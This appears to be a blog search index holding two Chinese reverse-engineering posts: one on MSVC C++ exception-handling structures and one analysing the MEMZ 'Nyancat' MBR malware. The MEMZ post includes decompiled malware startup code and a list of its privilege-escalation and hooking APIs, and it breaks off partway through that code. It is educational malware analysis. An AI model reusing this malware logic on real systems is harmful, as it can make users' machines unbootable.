<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>C++异常处理分析与还原</title>
      <link href="/c++%E5%BC%82%E5%B8%B8/"/>
      <url>/c++%E5%BC%82%E5%B8%B8/</url>
      
        <content type="html"><![CDATA[<h2 id="c-异常处理"><a href="#c-异常处理" class="headerlink" title="c++异常处理"></a>c++异常处理</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (argc == <span class="number">1</span>)</span><br><span class="line"><span class="keyword">throw</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">catch</span> (<span class="type">int</span> e)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;catch int &quot;</span> &lt;&lt; e &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">catch</span> (...)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;catch all&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一旦try内的语句有抛出（throw）异常，就会去搜索对应的catch块执行语句</p><p>值得注意的是，在C++中，当一个异常被抛出时，程序会在找到第一个匹配的catch块之后处理该异常，然后继续执行后续代码。并且，一旦异常被捕获并处理，程序不会再继续搜索其他的catch块来处理同一个异常。</p><h3 id="事件查看器"><a href="#事件查看器" class="headerlink" title="事件查看器"></a>事件查看器</h3><p>介绍下事件查看器这个工具</p><p><img src="/c++%E5%BC%82%E5%B8%B8/1718600434405.png" alt="1718600434405"></p><p>可以用来查看具体是什么异常，但是貌似也可以用调试？？</p><p>这里手动造一个异常</p><p><img src="/c++%E5%BC%82%E5%B8%B8/1718600575669.png" alt="1718600575669"></p><p>打开事件查看器，就可以发现具体的错误码和错误偏移，还有路径</p><p><img src="/c++%E5%BC%82%E5%B8%B8/1718600561100.png" alt="1718600561100"></p><p>值得注意的是，这个偏移量是ROV，相对于ImageBase的偏移</p><h3 id="具体分析C-异常过程"><a href="#具体分析C-异常过程" class="headerlink" title="具体分析C++异常过程"></a>具体分析C++异常过程</h3><p><img src="/c++%E5%BC%82%E5%B8%B8/1719219097725.png" alt="1719219097725"></p><p>测试代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">catch</span> (<span class="type">int</span> e)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;触发int异常\n&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">catch</span> (<span class="type">float</span> e)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;触发了float异常\n&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当某个函数有try catch的时候，会在函数头注册一个异常回调函数：</p><p>例如下面的main函数开头：</p><p><img src="/c++%E5%BC%82%E5%B8%B8/1718710227685.png" alt="1718710227685"></p><p><img src="/c++%E5%BC%82%E5%B8%B8/1719061935153.png" alt="1719061935153"></p><p>分析一下这个代码是干啥的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.text:00412640 55                            push    ebp</span><br><span class="line">.text:00412641 8B EC                         mov     ebp, esp</span><br><span class="line">.text:00412643 6A FF                         push    0FFFFFFFFh</span><br><span class="line">.text:00412645 68 00 77 41 00                push    offset __ehhandler$_main</span><br><span class="line">.text:0041264A 64 A1 00 00 00 00             mov     eax, large fs:0</span><br><span class="line">.text:00412650 50                            push    eax</span><br><span class="line">.text:00412651 51                            push    ecx</span><br><span class="line">.text:00412652 81 EC 08 01 00 00             sub     esp, 108h</span><br><span class="line">.text:00412658 53                            push    ebx</span><br><span class="line">.text:00412659 56                            push    esi</span><br><span class="line">.text:0041265A 57                            push    edi</span><br></pre></td></tr></table></figure><p>push    offset  __ ehhandler$ _main，这是一个函数指针，放入栈中</p><p>mov     eax, large fs:0将异常链表存入eax</p><p>后续会有</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:00412675 8D 45 F4                      lea     eax, [ebp-0Ch]</span><br><span class="line">.text:00412678 64 A3 00 00 00 00             mov     large fs:0, eax</span><br></pre></td></tr></table></figure><p>这个就是将__ehhandler $ _main这个函数置为链表头，原来的作为Next指针存着</p><p>这样就实现了将函数_ _ehhandler$ _main 挂入异常链表</p><p>在含有try的函数结束之后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:008527A6 8B 4D F4                      mov     ecx, [ebp+var_C]</span><br><span class="line">.text:008527A9 64 89 0D 00 00 00 00          mov     large fs:0, ecx</span><br></pre></td></tr></table></figure><p>会有一个注销异常链表的操作，这里就是拿出next，然后覆盖掉原来的异常链表，这样，就恢复了原来的异常链表（即注销）</p><p>之前的 push    0FFFFFFFFh，代表try还没开始，也就是说 [ebp-0x4] 位置代表着 trylevel，如果是0xffffffff则代表try块还未开始，如果是0，就代表进入try块</p><p>当结束try块以后，还是会将这个trylevel置为-1</p><p><img src="/c++%E5%BC%82%E5%B8%B8/1719062524688.png" alt="1719062524688"></p><p>如果有try嵌套：</p><p><img src="/c++%E5%BC%82%E5%B8%B8/1719062762747.png" alt="1719062762747"></p><p>反正也是赋值为非负的一个数</p><p>双击__enhandler__$main</p><p>在调用函数__CxxFrameHandler之前，会传递一个参数，这里就是eax</p><p>其实这就是FuncInfo函数信息表</p><p><img src="/c++%E5%BC%82%E5%B8%B8/1718710265704.png" alt="1718710265704"></p><h4 id="FuncInfo结构"><a href="#FuncInfo结构" class="headerlink" title="FuncInfo结构"></a>FuncInfo结构</h4><p>介绍一下<strong>FuncInfo</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">FuncInfo</span></span><br><span class="line">&#123;</span><br><span class="line">    magicNumber dd ;? <span class="comment">//编译器生成的固定数字</span></span><br><span class="line">    maxState dd ? ;<span class="comment">//最大栈展开数的下标值，也就是trylevel最大不能超过maxState,同时也是栈展开最大的次数</span></span><br><span class="line">    pUnwindMap dd ? ;<span class="comment">//指向栈展开函数表的指针，指向UnwindMapEntry表结构</span></span><br><span class="line">    dwTryCount dd ? ;<span class="comment">//一个函数里面的Try块的数量</span></span><br><span class="line">    pTryBlockMap dd ? ;<span class="comment">//Try块的列表，指向TryBlockMapEntry表的结构</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//64位程序下会额外多几个成员</span></span><br></pre></td></tr></table></figure><p>其中pUnwindMap和pTryBlockMap分别指向 UnwindMapEntry 和 TryBlockMapEntry 结构</p><p>UnwindMapEntry要配合FuncInfo里面的maxState使用。</p><p>UnwindMapEntry的作用：栈展开的时候需要执行的函数由UnwindMapEntry表记录</p><p>TryBlockMapEntry的作用：这个结构用来判断异常产生在哪一个Try块</p><h4 id="UnwindMapEntry结构"><a href="#UnwindMapEntry结构" class="headerlink" title="UnwindMapEntry结构"></a>UnwindMapEntry结构</h4><p>这个结构记录了需要执行函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">UnwindMapEntry</span></span><br><span class="line">&#123;</span><br><span class="line">    DWORD toState;<span class="comment">//栈展开数下标值,即Trylevel，到时候看范围就知道</span></span><br><span class="line">    DWORD lpFuncAction;<span class="comment">//展开执行的函数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于栈展开存在多个对象，因此以数组的形式记录每个对象的析构信息</p><p>toState 项用来判断结构是否属于处于数组中，lpFuncAction用于记录析构函数所在的地址</p><h4 id="TryBlockMapEntry结构"><a href="#TryBlockMapEntry结构" class="headerlink" title="TryBlockMapEntry结构"></a>TryBlockMapEntry结构</h4><p>在这个结构体中可以知道对应的Try有几个Catch，并且能找到对应的Catch块</p><p>TryBlockMapEntry块成员长这样：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">TryBlockMapEntry</span></span><br><span class="line">&#123;</span><br><span class="line">    DWORD tryLow;<span class="comment">//try块的最小状态索引，用于范围检查（trylevel的最小索引）</span></span><br><span class="line">    DWORD tryHigh;  <span class="comment">//try块的最大状态索引，用于范围检查（trylevel的最大索引）</span></span><br><span class="line">    DWORD catchHigh; <span class="comment">//catch块的最高状态索引，用于范围检查（trylevel的上限）</span></span><br><span class="line">    DWORD dwCatchCount;<span class="comment">//catch块的个数</span></span><br><span class="line">    DOWRD pCatchHandlerArray; <span class="comment">//catch块的描述，指向_msRttiDscr表结构</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>TryBlockMapEnrty 表结构用于判断异常产生在哪一个try块，tryLow，tryHigh 项用于检查产生的异常是否来源于try块中</p><p><img src="/c++%E5%BC%82%E5%B8%B8/1719197846739.png" alt="1719197846739"></p><p>最左边的TryLow才是真正的trylevel下标，另外一个TryHigh是用来描述范围的</p><h4 id="msRttiDscr-结构"><a href="#msRttiDscr-结构" class="headerlink" title="_msRttiDscr 结构"></a>_msRttiDscr 结构</h4><p>这个结构用于描述try块中的某一个catch块的信息</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">_msRttiDscr</span></span><br><span class="line">&#123;</span><br><span class="line">    DWORD nFlag;<span class="comment">//用于Catch块的匹配检查</span></span><br><span class="line">    DWORD pType;<span class="comment">//catch块要捕捉的类型，指向TypeDescriptor表结构，如果是零，就代表所有类型，即catch all</span></span><br><span class="line">    DWORD dispCatchObjOffset;  <span class="comment">//用于定位异常对象在当前ESP中的偏移位置</span></span><br><span class="line">    DWORD CatchProc;<span class="comment">//catch块的首地址，可以用来定位catch</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>具体来说：</p><p>nFlag标记用于检查catch块的类型匹配：</p><p>如果是 1 ：常量2：变量4：未知8:引用</p><p>异常的匹配信息存在pType所指向的结构</p><p>这个结构便是 TypeDescriptor</p><h4 id="TypeDescriptor结构"><a href="#TypeDescriptor结构" class="headerlink" title="TypeDescriptor结构"></a>TypeDescriptor结构</h4><p>这是一个记录 异常类型的结构：具体结构长这样：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">TypeDescriptor</span></span><br><span class="line">&#123;</span><br><span class="line">    DWORD Hash;<span class="comment">//类型名称的Hash数值</span></span><br><span class="line">    DWORD spare;<span class="comment">//保留</span></span><br><span class="line">    DWORD name;<span class="comment">//类型名称</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有了这些信息之后，就可以通过与抛出异常时的信息进行对比，得到对应的表结构</p><p>再通过_msRttiDscr结构中的CatchProc得到catch块的首地址</p><h3 id="关于throw"><a href="#关于throw" class="headerlink" title="关于throw"></a>关于throw</h3><p>抛出异常的工作 由 throw 抛出，在源代码含有throw的函数体中可以找到__CxxThrowException 这个函数，和之前  _CxxFrameHandler 类似，之前传进去的参数是FuncInfo，这回是  ThrowInfo</p><p><img src="/c++%E5%BC%82%E5%B8%B8/1719065341932.png" alt="1719065341932"></p><p>这样可以通过参数，去获取抛出的对象（或者数值）</p><p>另外一个参数就是ThrowInfo</p><p>每一个throw都对应一个ThrowInfo和一个拷贝的对象。里面包含着对应的信息，包括抛出对象的类型（ThrowInfo），里面放了什么（从拷贝对象可知）</p><p>下面是通过ThrowInfo和拷贝对象识别值和类型的过程</p><p><video src="C++逆向/QQ录屏20240623215701~1.mp4"></video></p><p><img src="/c++%E5%BC%82%E5%B8%B8/1719152317760.png" alt="1719152317760"></p><p>但是为什么会有两个RTTI，这是表示CMyException *的类型和void *类型的异常都可以被接收</p><h4 id="ThrowInfo结构"><a href="#ThrowInfo结构" class="headerlink" title="ThrowInfo结构"></a>ThrowInfo结构</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">ThrowInfo</span></span><br><span class="line">&#123;</span><br><span class="line">DWORD nFlag;  <span class="comment">//抛出异常类型标记</span></span><br><span class="line">    DWORD pDestructor;<span class="comment">//异常对象的析构函数地址</span></span><br><span class="line">    DWORD pForwardCompat;<span class="comment">//未知</span></span><br><span class="line">    DOWRD pCatchTableTypeArray <span class="comment">//catch块类型表，指向CatchTableTyoeArray表结构</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>nFlag为1的时候，表示抛出常量类型的异常；   2 表示抛出变量类型的异常</p><p>由于在try块中产生的异常被处理后就不会再返回try块了。因此pDestructor的作用就是记录try块里面的异常对象的析构函数地址，当异常处理完成以后调用异常对象的析构函数</p><p>抛出异常所对应的catch块的类型的信息被记录在pCatchTableTypeArray所指向的CatchTableTyoeArray表结构</p><h4 id="CatchTableTypeArray结构"><a href="#CatchTableTypeArray结构" class="headerlink" title="CatchTableTypeArray结构"></a>CatchTableTypeArray结构</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">CatchTableTyoeArray</span></span><br><span class="line">&#123;</span><br><span class="line">    DWORD dwCount;<span class="comment">//CatchTableType 数组包含的元素个数</span></span><br><span class="line">    DWORD ppCatchTableType;<span class="comment">//catch块的类型信息，类型为CatchTableType**</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ppCatchTableType是一个指向数组的指针，dwCount用来描述数组中元素的个数</p><p>CatchTableType中含有含有处理异常时的所需相关信息</p><h4 id="CatchTableType结构"><a href="#CatchTableType结构" class="headerlink" title="CatchTableType结构"></a>CatchTableType结构</h4><p>CatchTableType中含有含有处理异常时的所需相关信息</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">CatchTableType</span></span><br><span class="line">&#123;</span><br><span class="line">    DWORD flag;</span><br><span class="line">    DWORD pTypeInfo;<span class="comment">//指向异常类型的结构,指向TypeDescriptor表结构</span></span><br><span class="line">    DWORD thisDisplacement; <span class="comment">//基类信息</span></span><br><span class="line">    DWORD sizeorOffset; <span class="comment">//类的大小</span></span><br><span class="line">    DWORD pCopyFunction; <span class="comment">//复制构造函数的指针</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>flag用于标记异常对象属于哪一种类型，例如指针，引用，对象等，标记值所代表的含义为：</p><p>1：简单类型复制2：已被捕获4：有虚表基类复制8：指针和类型引用复制</p><p>当异常类型为对象的时候，由于对象存在基类等相关信息，因此需要将他们也记录下来，thisDisplacement保存了记录基类信息结构的首地址</p><p>PMD结构：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">PMD</span></span><br><span class="line">&#123;</span><br><span class="line">DWORD dwOffsetToThis;<span class="comment">//基类偏移</span></span><br><span class="line">    DWORD dwOffsetToVBase;<span class="comment">//虚基类偏移</span></span><br><span class="line">    DWORD dwOffsetToVbTable; <span class="comment">//基类虚表偏移</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意注意：</p><p>如果Try内有定义对象并且Throw了，那么就要进行析构，Try里面全部对象都要被析构</p><h3 id="还原代码的逻辑："><a href="#还原代码的逻辑：" class="headerlink" title="还原代码的逻辑："></a>还原代码的逻辑：</h3><p><img src="/c++%E5%BC%82%E5%B8%B8/1719198058819.png" alt="1719198058819"></p><p>进入一个函数首先看看有没有调用__CxxFrameHandler，和有没有对fs:[0]这个地址进行操作，这个是有异常的标志。</p><p>然后一顿操作，把FuncInfo解析出来，有maxState个UnwindMapEntry结构，里面有存析构函数（如果存在析构，具体执行顺序看下标），然后还有dwTryCount个TryBlockMapEntry结构，里面存着Catch块的具体地址（_msRttiDscr 结构）</p><p>catch可能不在IDA反编译出来的函数，所以看到try我们需要去自己找对应的catch</p><p>解决了这些结构体，就可以看汇编还原代码了。</p><p>不要把Catch当成一个函数，而是要把它当成代码块</p><p><img src="/c++%E5%BC%82%E5%B8%B8/1719218558733.png" alt="1719218558733"></p><p>看见trylevel为0，就可以匹配到对应的catch块了</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>彩虹猫病毒分析</title>
      <link href="/%E5%BD%A9%E8%99%B9%E7%8C%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
      <url>/%E5%BD%A9%E8%99%B9%E7%8C%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="彩虹猫简介"><a href="#彩虹猫简介" class="headerlink" title="彩虹猫简介"></a>彩虹猫简介</h2><p><img src="/%E5%BD%A9%E8%99%B9%E7%8C%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/1719747764271.png" alt="1719747764271"></p><blockquote><p>彩虹猫病毒，也称为 Nyancat 病毒，是一种恶意软件，通常被归类为计算机蠕虫或恶搞病毒。其名称和特征灵感来自于流行的互联网迷因“彩虹猫”（Nyancat），这是一只带着彩虹尾巴的动画猫。</p><p>彩虹猫病毒属于MBR病毒，从功能上看，它是一款恶作剧病毒。该病毒会修改MBR主引导扇区，以此来破坏电脑的正常启动。在修改MBR后，电脑重启会停留在一个彩虹猫的画面，因此该病毒被称为是彩虹猫病毒。但该病毒没有采取隐藏或者规避查杀等技术。</p><ol><li><strong>感染效果</strong>：<ul><li>一旦感染系统，彩虹猫病毒会修改系统文件或注册表，增加自身的启动项以确保重启后继续运行。</li><li>典型的恶搞效果是弹出彩虹猫动画，播放背景音乐，使得用户无法正常操作计算机。</li><li>病毒访问google网站和程序，使计算机变得难以使用。</li><li>确定之后，病毒就会打开很多个网页。链接指向了谷歌搜索，但是由于网络的缘故，我们不知道这个浏览器具体显示的是什么。紧接着，鼠标就会不受指控，不断抖动。还会不断弹出各种窗口铺满屏幕，有些窗口颜色会变成黑色或者褐色。</li></ul></li></ol></blockquote><h2 id="病毒初探："><a href="#病毒初探：" class="headerlink" title="病毒初探："></a>病毒初探：</h2><p>因为彩虹猫病毒没有采用隐藏或规避查杀技术，并且里面一堆敏感API，所以我们选择在虚拟机中操作，然后把Windows自带的安全系统关闭，否则会一直报毒</p><p>切记分析病毒最好把后缀改一下，反正后缀不要是exe，不然手贱点到，问题就麻烦了</p><p><img src="/%E5%BD%A9%E8%99%B9%E7%8C%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/1719747807261.png" alt="1719747807261"></p><h2 id="查个壳子："><a href="#查个壳子：" class="headerlink" title="查个壳子："></a>查个壳子：</h2><p>拖到DIE看看，发现没有壳子，然后是VS2015版本写的</p><p>好歹不是VB，Delphi这种上古语言。</p><p><img src="/%E5%BD%A9%E8%99%B9%E7%8C%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/1719748074381.png" alt="1719748074381"></p><p>然后看看导入表，发现有这些dll</p><p><img src="/%E5%BD%A9%E8%99%B9%E7%8C%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/1719748199363.png" alt="1719748199363"></p><table><thead><tr><th>dll</th><th>作用</th></tr></thead><tbody><tr><td>KERNEL32.DLL</td><td>核心系统功能。文件操作、内存管理、进程和线程管理、同步对象、输入&#x2F;输出操作等。</td></tr><tr><td>USER32.DLL</td><td>用户界面功能。窗口管理、消息处理、对话框、菜单、图标、键盘和鼠标输入等。</td></tr><tr><td>GDI32.DLL</td><td>图形设备接口。绘图功能，包括文本、图形、位图、字体等操作。</td></tr><tr><td>ADVAPI32.DLL</td><td>高级 Windows API。注册表操作、服务管理、安全和访问控制、加密等。</td></tr><tr><td>SHELL32.DLL</td><td>Windows Shell API。文件操作、桌面管理、任务栏、文件对话框、快捷方式等。</td></tr><tr><td>WINMM.DLL</td><td>多媒体功能。音频和视频播放、MIDI、计时器、多媒体资源管理等。</td></tr><tr><td>PAAPI.DLLWindows</td><td>系统进程状态支持模块</td></tr></tbody></table><p>这里不得不提到在彩虹猫里面用到的一些函数：</p><table><thead><tr><th>功能实现</th><th>对应的链接库</th><th>对应的函数</th></tr></thead><tbody><tr><td>改变窗口颜色和大小</td><td>GDI32</td><td>bitblt、stretchblt</td></tr><tr><td>调用浏览器等外部程序</td><td>SHELL32</td><td>ShellExecute</td></tr><tr><td>反复出现系统提示音</td><td>WINMM</td><td>PlaySoundA</td></tr><tr><td>鼠标不受控制的晃动</td><td>USER32</td><td>GetCursorPos，SetCursorPos</td></tr><tr><td>进程提权</td><td>ADVAPI32</td><td>OpenprocessToken、LookupPrivilegeValue、AdjustTokenPrivileges</td></tr><tr><td>遍历进程</td><td>KERNEL32</td><td>CreateToolhelp32Snapshot、Process32First、Process32Next</td></tr><tr><td>给窗口下钩子</td><td>USER32</td><td>SetWindowHookEx、UnhookWindowHookEx、CallNextHookEx</td></tr></tbody></table><h2 id="分析代码："><a href="#分析代码：" class="headerlink" title="分析代码："></a>分析代码：</h2><h3 id="释放子体阶段"><a href="#释放子体阶段" class="headerlink" title="释放子体阶段"></a>释放子体阶段</h3><p>开局进入Start函数，似乎和我以前分析的vs程序来得简单粗暴？</p><p>代码量确实巨大，不过一步步分析也能学到很多</p><p>确实里面调用的危险API一点也不隐藏加密，难怪疯狂报毒</p><p><img src="/%E5%BD%A9%E8%99%B9%E7%8C%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/1719749001353.png" alt="1719749001353"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CommandLineW = <span class="built_in">GetCommandLineW</span>();</span><br><span class="line">v1 = <span class="built_in">CommandLineToArgvW</span>(CommandLineW, &amp;pNumArgs);</span><br></pre></td></tr></table></figure><p>GetCommandLineW是一个 Windows API 函数，用于获取当前进程的命令行字符串。这个函数在需要获取启动应用程序时所使用的命令行参数时非常有用。</p><p>CommandLineToArgvW 是一个 Windows API 函数，用于将命令行字符串解析为参数数组。该函数特别有用，因为它可以正确处理带有引号的参数，这在手动解析命令行字符串时可能会遇到困难。</p><p><img src="/%E5%BD%A9%E8%99%B9%E7%8C%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/1719749203186.png" alt="1719749203186"></p><p>由于是我们双击启动的，所以不会进入上面图片的这个if，所以我们先略过</p><p>接下来我们分析这一段：</p><p><img src="/%E5%BD%A9%E8%99%B9%E7%8C%AB%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/1719749342038.png" alt="1719749342038"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="built_in">MessageBoxA</span>(</span><br><span class="line">         <span class="number">0</span>,</span><br><span class="line">         <span class="string">&quot;The software you just executed is considered malware.\r\n&quot;</span></span><br><span class="line">         <span class="string">&quot;This malware will harm your computer and makes it unusable.\r\n&quot;</span></span><br><span class="line">         <span class="string">&quot;If you are seeing this message without knowing what you just executed, simply press No and nothing will happen.&quot;</span></span><br><span class="line">         <span class="string">&quot;\r\n&quot;</span></span><br><span class="line">         <span class="string">&quot;If you know what this malware does and are using a safe environment to test, press Yes to start it.\r\n&quot;</span></span><br><span class="line">         <span class="string">&quot;\r\n&quot;</span></span><br><span class="line">         <span class="string">&quot;DO YOU WANT TO EXECUTE THIS MALWARE, RESULTING IN AN UNUSABLE MACHINE?&quot;</span>,</span><br><span class="line">         <span class="string">&quot;MEMZ&quot;</span>,</span><br><span class="line">         <span class="number">0x34</span>u) == <span class="number">6</span></span><br><span class="line">    &amp;&amp; <span class="built_in">MessageBoxA</span>(</span><br><span class="line">         <span class="number">0</span>,</span><br><span class="line">         <span class="string">&quot;THIS IS THE LAST WARNING!\r\n&quot;</span></span><br><span class="line">         <span class="string">&quot;\r\n&quot;</span></span><br><span class="line">         <span class="string">&quot;THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE MADE USING THIS MALWARE!\r\n&quot;</span></span><br><span class="line">         <span class="string">&quot;STILL EXECUTE IT?&quot;</span>,</span><br><span class="line">         <span class="string">&quot;MEMZ&quot;</span>,</span><br><span class="line">         <span class="number">0x34</span>u) == <span class="number">6</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = (WCHAR *)<span class="built_in">LocalAlloc</span>(<span class="number">0x40</span>u, <span class="number">0x4000</span>u);</span><br><span class="line">    <span class="built_in">GetModuleFileNameW</span>(<span class="number">0</span>, v10, <span class="number">0x2000</span>u);</span><br><span class="line">    v11 = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">ShellExecuteW</span>(<span class="number">0</span>, <span class="number">0</span>, v10, <span 